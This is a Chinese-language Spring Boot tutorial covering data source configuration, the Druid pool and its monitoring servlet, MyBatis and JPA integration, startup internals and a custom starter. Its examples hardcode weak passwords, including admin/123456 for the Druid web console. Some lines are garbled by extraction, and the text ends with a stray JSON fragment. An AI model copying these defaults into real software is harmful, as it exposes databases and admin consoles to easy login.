class JDBCApplication {\n  public static void main(String[] args) {\n    SpringApplication.run(JDBCApplication.class,args);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n测试：\n\nimport com.pwddd.jdbc.JDBCApplication;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringRunner;\n\nimport javax.sql.DataSource;\nimport java.sql.SQLException;\n\n@RunWith(SpringRunner.class)\n@SpringBootTest(classes = {JDBCApplication.class})  // 此处如果不指定class,且当前测试类的路径和启动类的路径不一致，则找不到启动类报错。https://blog.csdn.net/pmdream/article/details/109119689\npublic class TestJDBC {\n\n  @Autowired\n  JdbcTemplate jdbcTemplate;\n\n  @Autowired\n  DataSource dataSource;\n\n  @Test\n  public void test() throws SQLException {\n    System.out.println(dataSource.getConnection());\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 数据交互配置原理\n\n在Springboot中默认使用org.apache.tomcat.jdbc.pool.DataSource作为数据源。数据源的相关配置在DataSourceProperties中。在org.springframework.boot.autoconfigure.jdbc.DataSourceConfiguration根据条件给容器中添加了多种数据源。可以使用spring.datasource.type配置要使用的数据源。如下面的代码所示\n\n@ConditionalOnClass({org.apache.tomcat.jdbc.pool.DataSource.class})\n@ConditionalOnProperty(\n  name = {"spring.datasource.type"},\n  havingValue = "org.apache.tomcat.jdbc.pool.DataSource",\n  matchIfMissing = true\n)\nstatic class Tomcat extends DataSourceConfiguration {\n  Tomcat() {\n  }\n\n  @Bean\n  @ConfigurationProperties(\n    prefix = "spring.datasource.tomcat"\n  )\n  public org.apache.tomcat.jdbc.pool.DataSource dataSource(DataSourceProperties properties) {\n    org.apache.tomcat.jdbc.pool.DataSource dataSource = (org.apache.tomcat.jdbc.pool.DataSource)this.createDataSource(properties, org.apache.tomcat.jdbc.pool.DataSource.class);\n    DatabaseDriver databaseDriver = DatabaseDriver.fromJdbcUrl(properties.determineUrl());\n    String validationQuery = databaseDriver.getValidationQuery();\n    if (validationQuery != null) {\n      dataSource.setTestOnBorrow(true);\n      dataSource.setValidationQuery(validationQuery);\n    }\n\n    return dataSource;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n除此之外，在org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer中定义了在程序运行时进行的数据操作：运行建表语句和创建数据库的语句。SQL语句位于classpath下的schema/data-all.sql或者schema/data.sql，也可以指定spring.datasource.data/schema\n\nList<Resource> scripts = this.getScripts("spring.datasource.data", this.properties.getData(), "data");\nList<Resource> scripts = this.getScripts("spring.datasource.schema", this.properties.getSchema(), "schema");\nprivate List<Resource> getScripts(String propertyName, List<String> resources, String fallback) {\n  if (resources != null) {\n    return this.getResources(propertyName, resources, true);\n  } else {\n    String platform = this.properties.getPlatform();\n    List<String> fallbackResources = new ArrayList();\n    fallbackResources.add("classpath*:" + fallback + "-" + platform + ".sql");\n    fallbackResources.add("classpath*:" + fallback + ".sql");\n    return this.getResources(propertyName, fallbackResources, false);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n如下所示：\n\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n\n1\n2\n\n\nSpringboot默认配置了一个JDBCTemplate数据源\n\n@Test\npublic void testJdbcTemplate(){\n  List<Map<String, Object>> maps = jdbcTemplate.queryForList("select * from t_admin");\n  System.out.println(maps.get(0));\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# Druid数据源\n\n引入Druid数据源\n\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>druid</artifactId>\n  <version>1.2.8</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n指定数据源的类型：\n\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\n\n\n1\n\n\n配置文件中配置相关的参数：\n\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n# Druid配置\nspring.datasource.initialSize: 5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=6000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=SELECT 1 FROM DUAL\nspring.datasource.test-while-idle=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\n\nspring.datasource.druid.filters=stat,wall,log4j\nspring.datasource.druid.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.druid.use-global-data-source-stat=true\nspring.datasource.druid.connection-properties=druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n直接这么配置没有办法注入到参数中，我们需要自定义Druid的配置类，然后指定配置文件的前缀\n\npackage com.pwddd.jdbc.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.sql.DataSource;\n\n@Configuration\npublic class DruidConfig {\n\n  @ConfigurationProperties(prefix = "spring.datasource.druid")\n  @Bean\n  public DataSource druidDataSource(){\n    return new DruidDataSource();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n配置druid的监控\n\npackage com.pwddd.jdbc.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport com.alibaba.druid.support.http.StatViewServlet;\nimport com.alibaba.druid.support.http.WebStatFilter;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.boot.web.servlet.ServletRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.sql.DataSource;\nimport java.util.Arrays;\nimport java.util.HashMap;\n\n@Configuration\npublic class DruidConfig {\n\n  @ConfigurationProperties(prefix = "spring.datasource.druid")\n  @Bean\n  public DataSource druidDataSource(){\n    return new DruidDataSource();\n  }\n\n  @Bean\n  public ServletRegistrationBean statViewServlet(){\n\n    ServletRegistrationBean registrationBean = new ServletRegistrationBean(new StatViewServlet(), "/druid/*");\n    HashMap<String, String> map = new HashMap<>();\n    map.put("loginUsername","admin");\n    map.put("loginPassword","123456");\n    registrationBean.setInitParameters(map);\n    return registrationBean;\n  }\n\n  @Bean\n  public FilterRegistrationBean webStatFilter(){\n    FilterRegistrationBean registrationBean = new FilterRegistrationBean(new WebStatFilter());\n    HashMap<String, String> initParameters = new HashMap<>();\n    initParameters.put("exclusions","*.js,*.css,*.html,/druid/*");\n    registrationBean.setInitParameters(initParameters);\n    registrationBean.setUrlPatterns(Arrays.asList("/*"));\n    return registrationBean;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 整合mybatis\n\n 1. 引入相关依赖：\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelVersion>4.0.0</modelVersion>\n\n  <groupId>com.pwddd.mybatis</groupId>\n  <artifactId>springboot-mybatis</artifactId>\n  <version>1.0-SNAPSHOT</version>\n\n  <parent>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <groupId>org.springframework.boot</groupId>\n    <version>1.5.9.RELEASE</version>\n  </parent>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-test</artifactId>\n      <scope>test</scope>\n    </dependency>\n\n    <dependency>\n      <groupId>mysql</groupId>\n      <artifactId>mysql-connector-java</artifactId>\n      <version>8.0.28</version>\n      <scope>runtime</scope>\n    </dependency>\n\n    <dependency>\n      <groupId>com.alibaba</groupId>\n      <artifactId>druid</artifactId>\n      <version>1.2.8</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.mybatis.spring.boot</groupId>\n      <artifactId>mybatis-spring-boot-starter</artifactId>\n      <version>2.2.2</version>\n    </dependency>\n  </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n 2. 配置Druid数据源\n\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n# Druid配置\nspring.datasource.initialSize: 5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=6000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=SELECT 1 FROM DUAL\nspring.datasource.test-while-idle=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\n\nspring.datasource.druid.filters=stat,wall,log4j\nspring.datasource.druid.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.druid.use-global-data-source-stat=true\nspring.datasource.druid.connection-properties=druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\npackage com.pwddd.mybatis.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport com.alibaba.druid.support.http.StatViewFilter;\nimport com.alibaba.druid.support.http.StatViewServlet;\nimport com.alibaba.druid.support.http.WebStatFilter;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.boot.web.servlet.ServletRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.sql.DataSource;\nimport java.util.Arrays;\nimport java.util.HashMap;\n\n@Configuration\npublic class DruidConfig {\n\n    @ConfigurationProperties("spring.datasource")\n    @Bean\n    public DataSource dataSource(){\n        return new DruidDataSource();\n    }\n\n    @Bean\n    public ServletRegistrationBean statViewServlet(){\n        ServletRegistrationBean registrationBean =\n                new ServletRegistrationBean(new StatViewServlet(),"/druid/*");\n        HashMap<String, String> map = new HashMap<>();\n        map.put("loginUsername","admin");\n        map.put("loginPassword","123456");\n        registrationBean.setInitParameters(map);\n        return registrationBean;\n    }\n\n    @Bean\n    public FilterRegistrationBean statFilter(){\n        WebStatFilter filter = new WebStatFilter();\n        FilterRegistrationBean bean = new FilterRegistrationBean(filter);\n        HashMap<String, String> initParameters = new HashMap<>();\n        initParameters.put("exclusions","*.js,*.html,*.css,/druid/*");\n        bean.setInitParameters(initParameters);\n        bean.setUrlPatterns(Arrays.asList("/*"));\n        return bean;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n 3. 创建JavaBean\n\npackage com.pwddd.mybatis.bean;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class Admin {\n  private String id;\n  private String username;\n  private String passwd;\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n 4. 创建mapper和对应的接口\n\npackage com.pwddd.mybatis.mapper;\n\nimport com.pwddd.mybatis.bean.Admin;\nimport org.apache.ibatis.annotations.Mapper;\n\nimport java.util.List;\n\n@Mapper\npublic interface AdminMapper {\n\n  List<Admin> list();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd" >\n<mapper namespace="com.pwddd.mybatis.mapper.AdminMapper">\n\n  <select id="list" resultType="Admin">\n    select * from t_admin\n  </select>\n</mapper>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 5. 添加配置\n\nmybatis.mapper-locations=classpath:mapper/*.xml\nmybatis.type-aliases-package=com.pwddd.mybatis.be注入Mapper\n\n\n1\n2\n\n\n@RestController\n@RequestMapping("/admin")\npublic class AdminController {\n\n  @Autowired\n  private AdminMapper adminMapper;\n\n  @RequestMapping("/list")\n  public List<Admin> adminList(){\n    return adminMapper.list();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 6. 批量扫描包\n\n@SpringBootApplication\n@MapperScan(basePackages = "com.pwddd.mybatis.mapper")\npublic class MybatisApplication {\n  public static void main(String[] args) {\n    SpringApplication.run(MybatisApplication.class,args);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 7. 自定义Myabtis配置\n\nspringboot配置mybatis也是使用自动配置完成的。在创建SQL SessionFactory时会获取所有的Configuration，因此我们只需要自定义一个ConfigurationCustomizer，然后加入到容器中即可。\n\npackage com.pwddd.mybatis.config;\n\nimport org.mybatis.spring.boot.autoconfigure.ConfigurationCustomizer;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\npublic class MybatisConfig {\n\n  @Bean\n  public ConfigurationCustomizer configurationCustomizer(){\n    return new ConfigurationCustomizer() {\n\n      @Override\n      public void customize(org.apache.ibatis.session.Configuration configuration) {\n        configuration.setAggressiveLazyLoading(true);\n      }\n    };\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n源码：\n\nprivate void applyConfiguration(SqlSessionFactoryBean factory) {\n  org.apache.ibatis.session.Configuration configuration = this.properties.getConfiguration();\n  if (configuration == null && !StringUtils.hasText(this.properties.getConfigLocation())) {\n    configuration = new org.apache.ibatis.session.Configuration();\n  }\n\n  if (configuration != null && !CollectionUtils.isEmpty(this.configurationCustomizers)) {\n    Iterator var3 = this.configurationCustomizers.iterator();\n\n    while(var3.hasNext()) {\n      ConfigurationCustomizer customizer = (ConfigurationCustomizer)var3.next();\n      customizer.customize(configuration);\n    }\n  }\n\n  factory.setConfiguration(configuration);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 8. 配置全局配置文件\n\nmybatis.config-location=classpath:mybatis-config.xml\n\n\n1\n\n\n\n# 整合JPA\n\n# SpringData简介\n\n\n\n应用程序面向SpringData编程，由SpringData帮助我们完成具体的实现。\n\n# 整合方法\n\n 1. 创建项目，引入spring-boot-starter-jpa\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelVersion>4.0.0</modelVersion>\n\n  <groupId>com.pwddd.jpa</groupId>\n  <artifactId>springboot-jpa</artifactId>\n  <version>1.0-SNAPSHOT</version>\n\n  <parent>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <groupId>org.springframework.boot</groupId>\n    <version>1.5.9.RELEASE</version>\n  </parent>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-data-jpa</artifactId>\n    </dependency>\n\n    <dependency>\n      <groupId>mysql</groupId>\n      <artifactId>mysql-connector-java</artifactId>\n      <version>8.0.28</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-jdbc</artifactId>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n  </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n 2. 创建配置文件\n\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    password: 123456\n    username: root\n    url: jdbc:mysql://localhost:3307/springboot\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 编写实体类，配置映射关系\n\npackage com.pwddd.jpa.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\n\nimport javax.persistence.*;\nimport javax.persistence.criteria.CriteriaBuilder;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\n@Entity // 配置标识\n@Table(name = "t_admin") // 配置数据表\npublic class Admin {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY) // 自增主键\n    private Integer id;\n\n    @Column(name = "user_name",length = 255)\n    private String username;\n    @Column(length = 255)\n    private String passwd;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 4. 编写接口操作数据\n\npackage com.pwddd.jpa.repository;\n\nimport com.pwddd.jpa.entity.Admin;\nimport org.springframework.data.jpa.repository.JpaRepository;\n//                                                    操作的实体，主键类型\npublic interface AdminRepository extends JpaRepository<Admin,String> {\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 5. 配置jpa\n\njpa:\n\thibernate:\n\t\tddl-auto: update # 更新或者创建表结构\n\tshow-sql: true # 显示查询\n\n\n1\n2\n3\n4\n\n 6. 注入repository\n\npackage com.pwddd.jpa.controller;\n\nimport com.pwddd.jpa.entity.Admin;\nimport com.pwddd.jpa.repository.AdminRepository;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\n@RequestMapping("/admin")\npublic class AdminController {\n\n    @Autowired\n    private AdminRepository repository;\n\n    @RequestMapping("/add")\n    public void addAdmin(Admin admin){\n        repository.save(admin);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Springboot 启动配置原理\n\n\n# 启动流程：\n\n * 创建SpringApplication对象\n\n * 调用initialize方法\n\n    private void initialize(Object[] sources) {\n        if (sources != null && sources.length > 0) {\n            this.sources.addAll(Arrays.asList(sources));\n        }\n\t\t\t// 判断是否为web应用\n        this.webEnvironment = this.deduceWebEnvironment();\n      \n      // 类路径下寻找ApplicationInitalizer保存\n      this.setInitializers(this.getSpringFactoriesInstances(ApplicationContextInitializer.class));\n      // 类路径下寻找  ApplicationListener 并保存\n      this.setListeners(this.getSpringFactoriesInstances(ApplicationListener.class));\n      // 多个配置类中找到有Main方法的配置类。 \n      this.mainApplicationClass = this.deduceMainApplicationClass();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * 运行run方法\n\npublic ConfigurableApplicationContext run(String... args) {\n        StopWatch stopWatch = new StopWatch();\n        stopWatch.start();\n        ConfigurableApplicationContext context = null;\n        FailureAnalyzers analyzers = null;\n        this.configureHeadlessProperty();\n  // \t获取SpringApplicationRUnListener 从类路径下的MATE-INF/spring.factories里寻找\n        SpringApplicationRunListeners listeners = this.getRunListeners(args);\n  \n  \t\t// 回掉所有listener的starting方法\n        listeners.starting();\n\n        try {\n          // 封装Args\n            ApplicationArguments applicationArguments = new DefaultApplicationArguments(args);\n          \t// 准备环境， 创建环境  配置环境  回调listener的environmentPrepared  方法\n          ConfigurableEnvironment environment = this.prepareEnvironment(listeners, applicationArguments);\n          \t// 打印启动时的banner \n          Banner printedBanner = this.printBanner(environment);\n            \n          \t// 创建context ioc容器\n          context = this.createApplicationContext();\n            \n          new FailureAnalyzers(context);\n          // 准备上下文环境\n       \t\t\t// 将env保存到ioc，获取所有的ApplicationInitalizer 调用initailze方法 ， 回调所有listener的contextPrepared方法。 最后回调 listener的contextLoaded方法\n          this.prepareContext(context, environment, liteners, applicationArguments, printedBanner);\n\t\t\t\t// 刷线容器 ioc容器初始化\n          this.refreshContext(context);\n          // callRUnner 获取所有的ApplicationRunner 、 然后获取所有的CommandLineRunner 并运行他们的run方法\n            this.afterRefresh(context, applicationArguments);\n          // 回调listener的finished方法\n            listeners.finished(context, (Throwable)null);\n            stopWatch.stop();\n            if (this.logStartupInfo) {\n                (new StartupInfoLogger(this.mainApplicationClass)).logStarted(this.getApplicationLog(), stopWatch);\n            }\n// 返回IOC容器\n            return context;\n        } catch (Throwable var9) {\n            this.handleRunFailure(context, listeners, (FailureAnalyzers)analyzers, var9);\n            throw new IllegalStateException(var9);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# 事件监听机制\n\n几个重要的事件回调机制\n\n配置在META-INF/spring.factories\n\nApplicationContextInitializer\n\nSpringApplicationRunListener\n\n只需要放在ioc容器中\n\nApplicationRunner\n\nCommandLineRunner\n\n\n# Springboot自定义starter\n\nstarter场景启动器：\n\n 1. 需要导入的依赖\n\n 2. 如何编写自动配置\n\n@Configuration //指定这个类是一个配置类 \n@ConditionalOnXXX //在指定条件成立的情况下自动配置类生效 \n@AutoConfigureAfter //指定自动配置类的顺序 \n@Bean //给容器中添加组件\n\n@ConfigurationPropertie//结合相关xxxProperties类来绑定相关的配置\n@EnableConfigurationProperties //让xxxProperties生效加入到容器中\n\n自动配置类要能加载 将需要启动就加载的自动配置类，配置在META‐INF/spring.factories org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\ org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\\ org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\\\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n\n\n# 步骤\n\n 1. 创建两个maven项目\n\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema‐instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven‐4.0.0.xsd"> <modelVersion>4.0.0</modelVersion>\n\n<groupId>com.atguigu.starter</groupId> \n  <artifactId>atguigu‐spring‐boot‐starter</artifactId> \n  <version>1.0‐SNAPSHOT</version>\n\n<!‐‐启动器‐‐> \n  <dependencies>\n\n<!‐‐引入自动配置模块‐‐> \n    <dependency> \n      <groupId>com.atguigu.starter</groupId> \n      <artifactId>atguigu‐spring‐boot‐starter‐autoconfigurer</artifactId> \n      <version>0.0.1‐SNAPSHOT</version> \n    </dependency> \n  </dependencies>\n\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n<?xml version="1.0" encoding="UTF‐8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema‐instance"\n\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven4.0.0.xsd">\n\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.atguigu.starter</groupId>\n    <artifactId>atguigu‐spring‐boot‐starter‐autoconfigurer</artifactId>\n    <version>0.0.1‐SNAPSHOT</version>\n    <packaging>jar</packaging>\n\n    <name>atguigu‐spring‐boot‐starter‐autoconfigurer</name>\n    <description>Demo project for Spring Boot</description>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring‐boot‐starter‐parent</artifactId>\n        <version>1.5.10.RELEASE</version>\n        <relativePath/>\n        <!‐‐ lookup parent from repository ‐‐>\n    </parent>\n\n    <properties>\n        <project.build.sourceEncoding>UTF‐8</project.build.sourceEncoding>\n        <project.reporting.outputEncoding>UTF‐8</project.reporting.outputEncoding>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencies>\n\n        <!‐‐引入spring‐boot‐starter；所有starter的基本配置‐‐>\n        <dependency>\n\n            <groupId>org.springframework.boot</groupId>\n\n            <artifactId>spring‐boot‐starter</artifactId>\n        </dependency>\n\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n自定义properties\n\npackage com.atguigu.starter;\n\nimport org.springframework.boot.context.properties.ConfigurationProperties;\n\n@ConfigurationProperties(prefix = "atguigu.hello")\npublic class HelloProperties {\nprivate String prefix; \n  private String suffix;\n\npublic String getPrefix() { return prefix; }\n\npublic void setPrefix(String prefix) { this.prefix = prefix; }\n\npublic String getSuffix() { return suffix; }\n\npublic void setSuffix(String suffix) { this.suffix = suffix; }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n自定义Service\n\npackage com.atguigu.starter;\n\npublic class HelloService {\n\nHelloProperties helloProperties;\n\npublic HelloProperties getHelloProperties() { return helloProperties; }\n\npublic void setHelloProperties(HelloProperties helloProperties) { this.helloProperties = helloProperties; }\n\npublic String sayHellAtguigu(String name){ \n  return helloProperties.getPrefix()+"‐" +name + helloProperties.getSuffix(); }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n自动配置\n\npackage com.atguigu.starter;\n\nimport org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.autoconfigure.condition.ConditionalOnWebApplication; import org.springframework.boot.context.properties.EnableConfigurationProperties; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration;\n\n@Configuration\n@ConditionalOnWebApplication //web应用才生效 @EnableConfigurationProperties(HelloProperties.class) \npublic class HelloServiceAutoConfiguration {\n\n  @Autowired HelloProperties helloProperties; \n  @Bean \n  public HelloService helloService(){\n\n    HelloService service = new HelloService();\n\n    service.setHelloProperties(helloProperties);\n\n    return service; \n  }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# springboot 基础 - 基于 1.5.9\n\n\n# springboot简介\n\nspringboot是简化spring应用开发的一个框架，其中整合了spring技术栈，是j2ee开发的一站式解决方案。在传统的基于ssm框架进行项目开发的过程中，我们需要配置大量的配置文件，用于约束框架的功能和配置。springboot基于“约定大于配置”的开发思想，各个组件的配置文件由springboot帮助我们完成，我们只需要少量的配置即可搭建一个项目开发的基本环境，更专注于业务代码的编写。\n\n使用springboot的优点：\n\n * 快速创建独立运行的spring应用，并可以集成主流的框架\n * 使用嵌入式的servlet容器，应用无需打war包\n * 使用starters进行自动依赖和版本控制\n * 主流框架的自动默认配置，无代码生成，开箱即用\n * 准生产环境的运行时监控\n * 天然集成云计算\n\n\n# 微服务\n\n> 